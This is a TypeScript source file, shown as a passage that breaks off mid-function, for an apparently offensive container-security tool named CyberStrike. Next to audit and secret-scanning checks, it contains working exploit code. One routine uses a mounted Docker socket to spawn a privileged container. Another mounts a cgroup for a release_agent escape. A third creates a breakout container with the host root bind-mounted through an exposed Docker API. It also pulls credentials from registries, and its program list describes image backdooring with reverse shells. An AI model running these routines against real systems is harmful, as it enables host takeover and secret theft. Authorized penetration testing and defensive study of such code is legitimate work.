import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  docker_enum: {
    description:
      "Enumerate Docker daemon: containers, images, volumes, networks, registries, and daemon configuration. Checks for exposed API, insecure registries, and privileged containers",
    args: "[--socket PATH] [--host HOST]",
  },
  docker_escape: {
    description:
      "Detect and exploit Docker container escape vectors: mounted socket, privileged mode, SYS_ADMIN/SYS_PTRACE caps, cgroup release_agent, host PID/network namespace",
    args: "[--exploit] [--method <socket|cgroup|nsenter|procfs>]",
  },
  image_scan: {
    description:
      "Scan container images for vulnerabilities, embedded secrets, and misconfigurations. Checks Dockerfile history, environment variables, and layer contents",
    args: "--image IMAGE [--deep]",
  },
  registry_dump: {
    description:
      "Enumerate and extract images from Docker registries. Detects anonymous access, lists repositories and tags, pulls manifests and configs with embedded credentials",
    args: "--registry URL [--username USER] [--password PASS]",
  },
  runtime_audit: {
    description:
      "Audit container runtime security: AppArmor/SELinux profiles, seccomp filters, capability sets, read-only rootfs, resource limits, user namespace mapping",
    args: "[--container ID] [--all]",
  },
  compose_secrets: {
    description:
      "Extract secrets from Docker Compose files, .env files, and container environment variables. Scans for API keys, passwords, tokens, and connection strings",
    args: "[--path DIR]",
  },
  docker_api_exploit: {
    description:
      "Scan for exposed Docker TCP API on ports 2375 (HTTP) and 2376 (TLS). Enumerates containers, images, and version info. Use --exploit to create a privileged breakout container via the API",
    args: "--target HOST [--port PORT] [--exploit]",
  },
  container_network: {
    description:
      "Enumerate container network namespaces, bridges, and inter-container connectivity. Lists subnets, gateways, attached containers, and cross-network exposure",
    args: "[--container ID]",
  },
  overlay_inspect: {
    description:
      "Inspect Docker overlay2 filesystem layers for deleted secrets, leaked credentials, and leftover config files. Requires root or host filesystem access",
    args: "[--image IMAGE] [--path DIR]",
  },
  podman_enum: {
    description:
      "Enumerate Podman containers, pods, images, and volumes. Detects rootless vs rootful mode, security options, and pod networking configuration",
    args: "[--remote HOST]",
  },
  build_cache_dump: {
    description:
      "Extract secrets from Docker BuildKit cache and build history. Inspects builder instances, build logs, and cache mounts for leaked credentials",
    args: "[--builder NAME]",
  },
  cgroup_escape: {
    description:
      "Detect and exploit cgroup v1/v2 escape vectors: release_agent write, device allow, cgroup namespace breakout. Enumerates cgroup mounts and writability",
    args: "[--exploit]",
  },
  container_creds: {
    description:
      "Extract credentials from running containers: mounted secrets, service account tokens, cloud metadata, SSH keys, config files, shell history",
    args: "[--container ID] [--all]",
  },
  swarm_enum: {
    description:
      "Enumerate Docker Swarm cluster: manager/worker nodes, services, tasks, secrets, configs, overlay networks, ingress routing",
    args: "",
  },
  containerd_exploit: {
    description:
      "Detect and exploit containerd socket/gRPC access: enumerate containers, images, namespaces. Check for exposed containerd socket and nerdctl availability",
    args: "[--socket PATH]",
  },
  image_backdoor: {
    description:
      "Create a backdoored container image with reverse shell, webshell, or custom payload committed from a running container for persistence",
    args: "--base IMAGE --name NAME [--cmd CMD]",
  },
  volume_dump: {
    description:
      "Enumerate and dump Docker volume contents. Searches for credentials, config files, database dumps, and sensitive data in named and anonymous volumes",
    args: "[--volume NAME] [--pattern REGEX]",
  },
  container_pivot: {
    description:
      "Use container as pivot point for lateral movement: ARP scan, port scan adjacent networks, enumerate reachable services across container bridges",
    args: "[--target CIDR] [--ports PORTS]",
  },
  namespace_exploit: {
    description:
      "Exploit Linux namespace misconfigurations: check user/PID/network namespace sharing, nsenter into host namespaces, enumerate namespace boundaries",
    args: "[--exploit] [--target PID]",
  },
  cleanup_container: {
    description:
      "Remove all CyberStrike-created containers, images, volumes, and networks (by label cyberstrike=true). ALWAYS run before leaving",
    args: "[--dry-run]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = {
  checkId: string
  provider: string
  severity: string
  status: string
  resource: string
  title: string
  details: string
  remediation: string
}
type HookResult = { output: string; findings: Finding[] }

// ── CLI helpers ──

async function run(
  cmd: string,
  args: string[],
  timeout: number,
): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  let proc: ReturnType<typeof Bun.spawn>
  try {
    proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  } catch (e) {
    return { stdout: "", stderr: e instanceof Error ? e.message : String(e), exitCode: 127 }
  }
  const ms = timeout * 1000
  let killed = false
  const timer = setTimeout(() => {
    killed = true
    proc.kill(9)
  }, ms)
  const reads = Promise.all([
    new Response(proc.stdout as ReadableStream).text(),
    new Response(proc.stderr as ReadableStream).text(),
  ])
  const [stdout, stderr] = await Promise.race([
    reads,
    new Promise<[string, string]>((r) => setTimeout(() => r(["", "(timed out)"]), ms + 2000)),
  ])
  clearTimeout(timer)
  const exitCode = killed ? 124 : await proc.exited
  return { stdout, stderr, exitCode }
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function hasFlag(args: string[], flag: string): boolean {
  return args.includes(flag)
}

function tryJson(s: string) {
  try {
    return JSON.parse(s)
  } catch {
    return null
  }
}

function docker(args: string[], socket: string | undefined, host: string | undefined, timeout: number) {
  const extra = [...(socket ? ["-H", `unix://${socket}`] : []), ...(host ? ["-H", host] : [])]
  return run("docker", [...extra, ...args], timeout)
}

// ── Programs ──

async function dockerEnum(args: string[], timeout: number): Promise<HookResult> {
  const socket = argVal(args, "--socket")
  const host = argVal(args, "--host")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Docker environment...\n"]

  const info = await docker(["info", "--format", "json"], socket, host, timeout)
  if (info.exitCode === 0) {
    const d = tryJson(info.stdout)
    if (d) {
      output.push(`[+] Docker version: ${d.ServerVersion}`)
      output.push(`    OS: ${d.OperatingSystem} (${d.Architecture})`)
      output.push(`    Containers: ${d.Containers} (running: ${d.ContainersRunning})`)
      output.push(`    Images: ${d.Images}`)
      output.push(`    Storage: ${d.Driver}`)
      output.push(`    Root dir: ${d.DockerRootDir}`)
      output.push(`    Security: ${(d.SecurityOptions || []).join(", ")}`)
      if (d.RegistryConfig?.InsecureRegistryCIDRs?.length > 1 || d.RegistryConfig?.IndexConfigs) {
        const insecure = Object.entries(d.RegistryConfig?.IndexConfigs || {})
          .filter(([, v]: [string, any]) => !v.Secure)
          .map(([k]) => k)
        if (insecure.length > 0) {
          findings.push({
            checkId: "CONT-ENUM-001",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: "docker://daemon",
            title: `Insecure registries configured: ${insecure.join(", ")}`,
            details: "Docker daemon allows HTTP connections to registries — images can be MITM'd",
            remediation: "Remove insecure registries from daemon.json",
          })
        }
      }
    }
  }
  if (info.exitCode !== 0) {
    output.push(`[!] Docker not accessible: ${info.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const containers = await docker(["ps", "-a", "--format", "json"], socket, host, timeout)
  if (containers.exitCode === 0) {
    const lines = containers.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Containers: ${lines.length}`)
    for (const line of lines) {
      const c = tryJson(line)
      if (!c) continue
      const priv = c.Labels?.includes("privileged") || false
      output.push(`    ${c.Names} (${c.Image}) — ${c.State} ${c.Status}${priv ? " [PRIVILEGED]" : ""}`)
      if (c.State === "running" && c.Ports) output.push(`      Ports: ${c.Ports}`)
    }
  }

  const images = await docker(["images", "--format", "json"], socket, host, timeout)
  if (images.exitCode === 0) {
    const lines = images.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Images: ${lines.length}`)
    for (const line of lines.slice(0, 20)) {
      const img = tryJson(line)
      if (img) output.push(`    ${img.Repository}:${img.Tag} — ${img.Size}`)
    }
  }

  const volumes = await docker(["volume", "ls", "--format", "json"], socket, host, timeout)
  if (volumes.exitCode === 0) {
    const lines = volumes.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Volumes: ${lines.length}`)
    for (const line of lines) {
      const v = tryJson(line)
      if (v) output.push(`    ${v.Name} (${v.Driver})`)
    }
  }

  const networks = await docker(["network", "ls", "--format", "json"], socket, host, timeout)
  if (networks.exitCode === 0) {
    const lines = networks.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Networks: ${lines.length}`)
    for (const line of lines) {
      const n = tryJson(line)
      if (n) output.push(`    ${n.Name} (${n.Driver}) — scope: ${n.Scope}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function dockerEscape(args: string[], timeout: number): Promise<HookResult> {
  const exploit = hasFlag(args, "--exploit")
  const method = argVal(args, "--method")
  const findings: Finding[] = []
  const output: string[] = ["[*] Checking container escape vectors...\n"]

  const socketPaths = ["/var/run/docker.sock", "/run/docker.sock", "/.dockerenv"]
  for (const p of socketPaths) {
    const check = await run("test", ["-e", p], 5)
    if (check.exitCode === 0) {
      output.push(`[+] Found: ${p}`)
      if (p.includes("docker.sock")) {
        findings.push({
          checkId: "CONT-ESC-001",
          provider: "docker",
          severity: "critical",
          status: "FAIL",
          resource: `container://${p}`,
          title: "Docker socket mounted inside container",
          details: "Docker socket is accessible — full host escape via docker run --privileged",
          remediation: "Remove docker socket mount from container configuration",
        })
        if (exploit && (!method || method === "socket")) {
          output.push(`[!] Exploiting socket escape...`)
          const id = await run(
            "docker",
            [
              "-H",
              `unix://${p}`,
              "run",
              "-d",
              "--privileged",
              "--pid=host",
              "--label",
              "cyberstrike=true",
              "alpine",
              "sleep",
              "3600",
            ],
            timeout,
          )
          if (id.exitCode === 0) output.push(`[+] Privileged container spawned: ${id.stdout.trim().substring(0, 12)}`)
        }
      }
    }
  }

  const caps = await run("cat", ["/proc/1/status"], 5)
  if (caps.exitCode === 0) {
    const capEff = caps.stdout.match(/CapEff:\s*(\S+)/)?.[1]
    if (capEff) {
      const capNum = parseInt(capEff, 16)
      const isPrivileged = capNum === 0x3fffffffff || capNum === 0x1ffffffffff
      output.push(`\n[+] Effective capabilities: ${capEff}${isPrivileged ? " [PRIVILEGED/ALL CAPS]" : ""}`)
      if (isPrivileged) {
        findings.push({
          checkId: "CONT-ESC-002",
          provider: "docker",
          severity: "critical",
          status: "FAIL",
          resource: "container://self",
          title: "Container running with all capabilities (privileged)",
          details: `CapEff=${capEff} — container has full kernel capabilities`,
          remediation: "Remove --privileged flag and drop unnecessary capabilities",
        })
      }
      const SYS_ADMIN = 1 << 21
      if (capNum & SYS_ADMIN) output.push(`    SYS_ADMIN: YES — cgroup escape possible`)
      const SYS_PTRACE = 1 << 19
      if (capNum & SYS_PTRACE) output.push(`    SYS_PTRACE: YES — process injection possible`)
    }
  }

  const hostPid = await run("ls", ["/proc/1/root/etc/hostname"], 5)
  if (hostPid.exitCode === 0) output.push(`\n[+] Host filesystem accessible via /proc/1/root/`)

  const cgroup = await run("cat", ["/proc/1/cgroup"], 5)
  if (cgroup.exitCode === 0) {
    const inDocker = cgroup.stdout.includes("docker") || cgroup.stdout.includes("kubepods")
    output.push(`\n[+] Cgroup: ${inDocker ? "containerized" : "possibly host"}`)
    if (exploit && (!method || method === "cgroup")) {
      output.push(`[!] Attempting cgroup release_agent escape...`)
      const d = "/tmp/cs-cgroup"
      await run("mkdir", ["-p", d], 5)
      const mount = await run("mount", ["-t", "cgroup", "-o", "rdma", "cgroup", d], 10)
      if (mount.exitCode === 0)
        output.push(`[+] Cgroup mounted at ${d} — write release_agent for host command execution`)
      if (mount.exitCode !== 0) output.push(`[!] Cgroup mount failed (expected if not privileged)`)
    }
  }

  if (findings.length === 0) output.push(`\n[-] No obvious escape vectors found`)

  return { output: output.join("\n"), findings }
}

async function imageScan(args: string[], timeout: number): Promise<HookResult> {
  const image = argVal(args, "--image")
  const deep = hasFlag(args, "--deep")
  const findings: Finding[] = []
  const output: string[] = []

  if (!image) return { output: "[!] Required: --image IMAGE", findings }

  output.push(`[*] Scanning image: ${image}\n`)

  const history = await run("docker", ["history", "--no-trunc", "--format", "json", image], timeout)
  if (history.exitCode === 0) {
    const lines = history.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Image layers: ${lines.length}`)
    const secretPatterns = /(?:password|secret|api.?key|token|credential|aws.?access|private.?key)/i
    for (const line of lines) {
      const layer = tryJson(line)
      if (!layer) continue
      const cmd = layer.CreatedBy || ""
      if (secretPatterns.test(cmd)) {
        output.push(`    [!] Potential secret in layer: ${cmd.substring(0, 200)}`)
        findings.push({
          checkId: "CONT-IMG-001",
          provider: "docker",
          severity: "high",
          status: "FAIL",
          resource: `image://${image}`,
          title: "Potential secret in image layer",
          details: cmd.substring(0, 500),
          remediation: "Use multi-stage builds and Docker secrets instead of embedding secrets in layers",
        })
      }
    }
  }

  const inspect = await run("docker", ["inspect", image], timeout)
  if (inspect.exitCode === 0) {
    const data = tryJson(inspect.stdout)
    if (data?.[0]) {
      const config = data[0].Config || {}
      const env = config.Env || []
      output.push(`\n[+] Environment variables: ${env.length}`)
      const secretPatterns =
        /(?:password|secret|api.?key|token|credential|aws|private.?key|database.?url|connection.?string)/i
      for (const e of env) {
        if (secretPatterns.test(e)) {
          output.push(`    [!] ${e.substring(0, 200)}`)
          findings.push({
            checkId: "CONT-IMG-002",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: `image://${image}`,
            title: "Secret in image environment variable",
            details: e.substring(0, 500),
            remediation: "Remove secrets from ENV and use runtime injection",
          })
        }
      }
      if (config.User === "" || config.User === "root") {
        output.push(`\n[!] Image runs as root`)
        findings.push({
          checkId: "CONT-IMG-003",
          provider: "docker",
          severity: "medium",
          status: "FAIL",
          resource: `image://${image}`,
          title: "Container runs as root user",
          details: `User: ${config.User || "(default root)"}`,
          remediation: "Add USER directive to Dockerfile with non-root user",
        })
      }
      output.push(`\n[+] Exposed ports: ${Object.keys(config.ExposedPorts || {}).join(", ") || "none"}`)
      output.push(`    Entrypoint: ${JSON.stringify(config.Entrypoint)}`)
      output.push(`    Cmd: ${JSON.stringify(config.Cmd)}`)
    }
  }

  if (deep) {
    const save = await run("docker", ["save", image], timeout)
    if (save.exitCode === 0) {
      output.push(`\n[+] Deep scan: extracting layer contents for secret analysis...`)
      output.push(`    (Full layer extraction available — pipe to tar for manual review)`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function registryDump(args: string[], timeout: number): Promise<HookResult> {
  const registry = argVal(args, "--registry")
  const username = argVal(args, "--username")
  const password = argVal(args, "--password")
  const findings: Finding[] = []
  const output: string[] = []

  if (!registry) return { output: "[!] Required: --registry URL", findings }

  output.push(`[*] Enumerating registry: ${registry}\n`)

  const authHeader =
    username && password
      ? ["-H", `Authorization: Basic ${Buffer.from(`${username}:${password}`).toString("base64")}`]
      : []

  const catalog = await run("curl", ["-sk", `${registry}/v2/_catalog`, ...authHeader, "--max-time", "30"], timeout)
  if (catalog.exitCode === 0) {
    const data = tryJson(catalog.stdout)
    if (data?.repositories) {
      output.push(`[+] Repositories: ${data.repositories.length}`)
      if (!username) {
        findings.push({
          checkId: "CONT-REG-001",
          provider: "docker",
          severity: "critical",
          status: "FAIL",
          resource: `registry://${registry}`,
          title: "Registry allows anonymous catalog listing",
          details: `${data.repositories.length} repositories accessible without authentication`,
          remediation: "Enable authentication on the registry",
        })
      }
      for (const repo of data.repositories.slice(0, 30)) {
        const tags = await run(
          "curl",
          ["-sk", `${registry}/v2/${repo}/tags/list`, ...authHeader, "--max-time", "10"],
          timeout,
        )
        const tagData = tryJson(tags.stdout)
        const tagList = tagData?.tags || []
        output.push(
          `    ${repo}: ${tagList.length} tags — ${tagList.slice(0, 5).join(", ")}${tagList.length > 5 ? "..." : ""}`,
        )

        if (tagList.length > 0) {
          const tag = tagList[0]
          const manifest = await run(
            "curl",
            [
              "-sk",
              `${registry}/v2/${repo}/manifests/${tag}`,
              "-H",
              "Accept: application/vnd.docker.distribution.manifest.v2+json",
              ...authHeader,
              "--max-time",
              "10",
            ],
            timeout,
          )
          const mData = tryJson(manifest.stdout)
          if (mData?.config?.digest) {
            const blob = await run(
              "curl",
              ["-sk", `${registry}/v2/${repo}/blobs/${mData.config.digest}`, ...authHeader, "--max-time", "15"],
              timeout,
            )
            const config = tryJson(blob.stdout)
            if (config?.config?.Env) {
              const secretPatterns = /(?:password|secret|api.?key|token|credential|aws)/i
              for (const e of config.config.Env) {
                if (secretPatterns.test(e)) {
                  findings.push({
                    checkId: "CONT-REG-002",
                    provider: "docker",
                    severity: "high",
                    status: "EXTRACTED",
                    resource: `registry://${registry}/${repo}:${tag}`,
                    title: `Secret in image config: ${repo}:${tag}`,
                    details: e.substring(0, 300),
                    remediation: "Remove secrets from image environment variables",
                  })
                  output.push(`      [!] Secret in ${repo}:${tag}: ${e.substring(0, 100)}`)
                }
              }
            }
          }
        }
      }
    }
  }
  if (catalog.exitCode !== 0) {
    output.push(`[!] Registry not accessible: ${catalog.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function runtimeAudit(args: string[], timeout: number): Promise<HookResult> {
  const container = argVal(args, "--container")
  const all = hasFlag(args, "--all")
  const findings: Finding[] = []
  const output: string[] = ["[*] Auditing container runtime security...\n"]

  const targets: string[] = []
  if (container) {
    targets.push(container)
  } else if (all) {
    const ps = await run("docker", ["ps", "-q"], timeout)
    if (ps.exitCode === 0) targets.push(...ps.stdout.trim().split("\n").filter(Boolean))
  } else {
    const ps = await run("docker", ["ps", "-q", "--last", "5"], timeout)
    if (ps.exitCode === 0) targets.push(...ps.stdout.trim().split("\n").filter(Boolean))
  }

  output.push(`[+] Auditing ${targets.length} container(s)\n`)

  for (const id of targets) {
    const inspect = await run("docker", ["inspect", id], timeout)
    if (inspect.exitCode !== 0) continue
    const data = tryJson(inspect.stdout)
    if (!data?.[0]) continue
    const c = data[0]
    const name = c.Name?.replace(/^\//, "") || id.substring(0, 12)
    output.push(`\n── ${name} (${c.Config?.Image || "?"}) ──`)

    const hc = c.HostConfig || {}
    if (hc.Privileged) {
      output.push(`  [!] PRIVILEGED MODE`)
      findings.push({
        checkId: "CONT-RT-001",
        provider: "docker",
        severity: "critical",
        status: "FAIL",
        resource: `container://${name}`,
        title: `Privileged container: ${name}`,
        details: "Container has full host access",
        remediation: "Remove --privileged flag",
      })
    }
    if (hc.PidMode === "host") output.push(`  [!] Host PID namespace`)
    if (hc.NetworkMode === "host") output.push(`  [!] Host network namespace`)
    if (hc.IpcMode === "host") output.push(`  [!] Host IPC namespace`)

    const caps = hc.CapAdd || []
    if (caps.length > 0) output.push(`  Capabilities added: ${caps.join(", ")}`)
    const capDrop = hc.CapDrop || []
    output.push(`  Capabilities dropped: ${capDrop.length > 0 ? capDrop.join(", ") : "NONE"}`)
    if (capDrop.length === 0 && !hc.Privileged) {
      findings.push({
        checkId: "CONT-RT-002",
        provider: "docker",
        severity: "medium",
        status: "FAIL",
        resource: `container://${name}`,
        title: `No capabilities dropped: ${name}`,
        details: "Container retains all default capabilities",
        remediation: "Add --cap-drop ALL and only --cap-add required capabilities",
      })
    }

    output.push(`  AppArmor: ${hc.AppArmorProfile || "unconfined"}`)
    output.push(`  Seccomp: ${hc.SecurityOpt?.find((s: string) => s.includes("seccomp")) || "default"}`)
    output.push(`  Read-only rootfs: ${hc.ReadonlyRootfs ? "YES" : "NO"}`)
    output.push(`  User: ${c.Config?.User || "root"}`)
    output.push(`  Restart policy: ${hc.RestartPolicy?.Name || "no"}`)

    const mounts = c.Mounts || []
    if (mounts.length > 0) {
      output.push(`  Mounts: ${mounts.length}`)
      for (const m of mounts) {
        const sensitive = m.Source?.match(/\/(etc|root|var\/run|proc|sys|boot)/)
        output.push(`    ${m.Source} → ${m.Destination} (${m.Mode || "rw"})${sensitive ? " [SENSITIVE]" : ""}`)
        if (sensitive) {
          findings.push({
            checkId: "CONT-RT-003",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: `container://${name}`,
            title: `Sensitive host path mounted: ${m.Source}`,
            details: `${m.Source} → ${m.Destination} (${m.Mode || "rw"})`,
            remediation: "Remove sensitive host path mounts",
          })
        }
      }
    }

    const limits = hc.Memory || hc.NanoCpus || hc.PidsLimit
    output.push(`  Resource limits: ${limits ? "configured" : "NONE"}`)
    if (!limits) {
      findings.push({
        checkId: "CONT-RT-004",
        provider: "docker",
        severity: "low",
        status: "FAIL",
        resource: `container://${name}`,
        title: `No resource limits: ${name}`,
        details: "Container has no memory/CPU/PID limits — DoS risk",
        remediation: "Set --memory, --cpus, and --pids-limit",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

async function composeSecrets(args: string[], timeout: number): Promise<HookResult> {
  const searchPath = argVal(args, "--path") || "."
  const findings: Finding[] = []
  const output: string[] = [`[*] Scanning for container secrets in: ${searchPath}\n`]

  const secretPatterns =
    /(?:password|secret|api[_-]?key|token|credential|aws[_-]?access|private[_-]?key|database[_-]?url|connection[_-]?string|mysql|postgres|redis|mongo)[\s]*[=:]/i

  const maskLine = (l: string): string => {
    const eq = l.indexOf("=")
    if (eq > 0) return `${l.substring(0, eq + 1)}[SECRET — ${l.length - eq - 1} chars]`
    const col = l.indexOf(": ")
    if (col > 0) return `${l.substring(0, col + 2)}[SECRET — ${l.length - col - 2} chars]`
    return `[SECRET LINE — ${l.length} chars]`
  }

  const composeFiles = await run(
    "find",
    [
      searchPath,
      "-maxdepth",
      "3",
      "-name",
      "docker-compose*.yml",
      "-o",
      "-name",
      "docker-compose*.yaml",
      "-o",
      "-name",
      "compose.yml",
      "-o",
      "-name",
      "compose.yaml",
    ],
    timeout,
  )
  if (composeFiles.exitCode === 0) {
    const files = composeFiles.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Compose files: ${files.length}`)
    for (const f of files) {
      const content = await run("cat", [f], 5)
      if (content.exitCode !== 0) continue
      const lines = content.stdout.split("\n")
      for (let i = 0; i < lines.length; i++) {
        if (secretPatterns.test(lines[i])) {
          output.push(`    [!] ${f}:${i + 1} — ${maskLine(lines[i].trim())}`)
          findings.push({
            checkId: "CONT-SEC-001",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: `file://${f}`,
            title: `Secret in compose file: ${f}`,
            details: `Line ${i + 1}: ${maskLine(lines[i].trim())}`,
            remediation: "Use Docker secrets or external secret management",
          })
        }
      }
    }
  }

  const envFiles = await run(
    "find",
    [searchPath, "-maxdepth", "3", "-name", ".env", "-o", "-name", ".env.*", "-o", "-name", "*.env"],
    timeout,
  )
  if (envFiles.exitCode === 0) {
    const files = envFiles.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Environment files: ${files.length}`)
    for (const f of files) {
      const content = await run("cat", [f], 5)
      if (content.exitCode !== 0) continue
      const lines = content.stdout.split("\n")
      for (let i = 0; i < lines.length; i++) {
        const line = lines[i].trim()
        if (line.startsWith("#") || !line.includes("=")) continue
        if (secretPatterns.test(line)) {
          output.push(`    [!] ${f}:${i + 1} — ${maskLine(line)}`)
          findings.push({
            checkId: "CONT-SEC-002",
            provider: "docker",
            severity: "high",
            status: "EXTRACTED",
            resource: `file://${f}`,
            title: `Secret in env file: ${f}`,
            details: `Line ${i + 1}: ${maskLine(line)}`,
            remediation: "Use a secrets manager instead of .env files",
          })
        }
      }
    }
  }

  const runningEnv = await run("docker", ["ps", "-q"], timeout)
  if (runningEnv.exitCode === 0) {
    const ids = runningEnv.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Checking env vars in ${ids.length} running container(s)`)
    for (const id of ids.slice(0, 10)) {
      const inspect = await run("docker", ["inspect", "--format", "{{.Name}} {{json .Config.Env}}", id], 10)
      if (inspect.exitCode !== 0) continue
      const name = inspect.stdout.split(" ")[0]?.replace(/^\//, "") || id
      const envStr = inspect.stdout.substring(inspect.stdout.indexOf("["))
      const env = tryJson(envStr) || []
      for (const e of env) {
        if (secretPatterns.test(e)) {
          output.push(`    [!] ${name}: ${maskLine(e as string)}`)
          findings.push({
            checkId: "CONT-SEC-003",
            provider: "docker",
            severity: "high",
            status: "EXTRACTED",
            resource: `container://${name}`,
            title: `Secret in container env: ${name}`,
            details: maskLine(e as string),
            remediation: "Use Docker secrets or volume-mounted secret files",
          })
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function dockerApiExploit(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const port = argVal(args, "--port")
  const exploit = hasFlag(args, "--exploit")
  const findings: Finding[] = []
  const output: string[] = []

  if (!target) return { output: "[!] Required: --target HOST", findings }

  const ports = port ? [port] : ["2375", "2376"]

  for (const p of ports) {
    const scheme = p === "2376" ? "https" : "http"
    const base = `${scheme}://${target}:${p}`
    output.push(`[*] Probing Docker API at ${base}...\n`)

    const version = await run("curl", ["-sk", "--max-time", "5", `${base}/version`], timeout)
    if (version.exitCode !== 0 || !version.stdout.includes("ApiVersion")) {
      output.push(`[-] No Docker API on ${base}`)
      continue
    }

    const v = tryJson(version.stdout)
    output.push(`[+] Docker API EXPOSED at ${base}!`)
    if (v) {
      output.push(`    Version: ${v.Version}, API: ${v.ApiVersion}, OS: ${v.Os}/${v.Arch}`)
      output.push(`    Kernel: ${v.KernelVersion}`)
    }
    findings.push({
      checkId: "CONT-API-001",
      provider: "docker",
      severity: "critical",
      status: "FAIL",
      resource: `docker://${target}:${p}`,
      title: `Docker API exposed on ${target}:${p}`,
      details: `Unauthenticated Docker API — full host takeover possible`,
      remediation: "Disable TCP socket or enable TLS mutual auth",
    })

    const containers = await run("curl", ["-sk", "--max-time", "5", `${base}/containers/json?all=true`], timeout)
    if (containers.exitCode === 0) {
      const list = tryJson(containers.stdout) || []
      output.push(`\n[+] Containers: ${list.length}`)
      for (const c of list.slice(0, 15)) {
        output.push(`    ${(c.Names || ["/unknown"])[0]} (${c.Image}) — ${c.State}`)
      }
    }

    const images = await run("curl", ["-sk", "--max-time", "5", `${base}/images/json`], timeout)
    if (images.exitCode === 0) {
      const list = tryJson(images.stdout) || []
      output.push(`\n[+] Images: ${list.length}`)
      for (const img of list.slice(0, 10)) {
        const tags = (img.RepoTags || ["<none>"]).join(", ")
        output.push(`    ${tags}`)
      }
    }

    if (exploit) {
      output.push(`\n[!] Creating privileged breakout container via API...`)
      const body = JSON.stringify({
        Image: "alpine",
        Cmd: ["/bin/sh", "-c", "sleep 3600"],
        HostConfig: { Privileged: true, PidMode: "host", NetworkMode: "host", Binds: ["/:/host"] },
        Labels: { cyberstrike: "true" },
      })
      const create = await run(
        "curl",
        ["-sk", "-X", "POST", `${base}/containers/create`, "-H", "Content-Type: application/json", "-d", body],
        timeout,
      )
      const created = tryJson(create.stdout)
      if (created?.Id) {
        await run("curl", ["-sk", "-X", "POST", `${base}/containers/${created.Id}/start`], timeout)
        output.push(`[+] Privileged container started: ${created.Id.substring(0, 12)}`)
        output.push(`    Host filesystem at /host, host PID namespace, host network`)
        findings.push({
          checkId: "CONT-API-002",
          provider: "docker",
          severity: "critical",
          status: "EXPLOITED",
          resource: `docker://${target}:${p}`,
          title: `Privileged container created via exposed API`,
          details: `Container ${created.Id.substring(0, 12)} — host escape achieved`,
          remediation: "Disable unauthenticated Docker API access immediately",
        })
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function containerNetwork(args: string[], timeout: number): Promise<HookResult> {
  const container = argVal(args, "--container")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating container network topology...\n"]

  const networks = await run("docker", ["network", "ls", "--format", "json"], timeout)
  if (networks.exitCode !== 0) return { output: output.join("\n") + "[-] Cannot list networks", findings }

  const lines = networks.stdout.trim().split("\n").filter(Boolean)
  output.push(`[+] Networks: ${lines.length}\n`)

  for (const line of lines) {
    const net = tryJson(line)
    if (!net) continue
    const inspect = await run("docker", ["network", "inspect", net.ID || net.Name], timeout)
    if (inspect.exitCode !== 0) continue
    const data = tryJson(inspect.stdout)
    if (!data?.[0]) continue
    const n = data[0]
    const config = n.IPAM?.Config?.[0] || {}
    output.push(`── ${n.Name} (${n.Driver}) ──`)
    output.push(`    Subnet: ${config.Subnet || "N/A"}, Gateway: ${config.Gateway || "N/A"}`)
    output.push(`    Internal: ${n.Internal || false}, Scope: ${n.Scope}`)

    const attached = Object.entries(n.Containers || {})
    if (attached.length > 0) {
      output.push(`    Attached containers: ${attached.length}`)
      for (const [, c] of attached) {
        const ct = c as Record<string, string>
        output.push(`      ${ct.Name} — ${ct.IPv4Address || "no IP"}`)
      }
    }

    if (!n.Internal && n.Driver === "bridge" && attached.length > 1) {
      findings.push({
        checkId: "CONT-NET-001",
        provider: "docker",
        severity: "medium",
        status: "FAIL",
        resource: `network://${n.Name}`,
        title: `${attached.length} containers share non-isolated bridge: ${n.Name}`,
        details: `Containers on bridge "${n.Name}" can communicate freely`,
        remediation: "Use network segmentation or internal networks for isolation",
      })
    }
    output.push("")
  }

  if (container) {
    output.push(`\n[*] Inspecting network config for container: ${container}`)
    const inspect = await run("docker", ["inspect", "--format", "json", container], timeout)
    if (inspect.exitCode === 0) {
      const data = tryJson(inspect.stdout)
      const nets = data?.[0]?.NetworkSettings?.Networks || {}
      for (const [name, cfg] of Object.entries(nets)) {
        const c = cfg as Record<string, string>
        output.push(`    ${name}: IP=${c.IPAddress}, Gateway=${c.Gateway}, MAC=${c.MacAddress}`)
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function overlayInspect(args: string[], timeout: number): Promise<HookResult> {
  const image = argVal(args, "--image")
  const searchPath = argVal(args, "--path") || "/var/lib/docker/overlay2"
  const findings: Finding[] = []
  const output: string[] = ["[*] Inspecting overlay filesystem layers...\n"]

  const secretPattern =
    "password\\|secret\\|api[_-]key\\|token\\|credential\\|private[_-]key\\|access[_-]key\\|connection[_-]string"

  if (image) {
    output.push(`[*] Extracting layers for image: ${image}`)
    const inspect = await run("docker", ["inspect", image], timeout)
    if (inspect.exitCode !== 0) return { output: output.join("\n") + `[-] Cannot inspect ${image}`, findings }
    const data = tryJson(inspect.stdout)
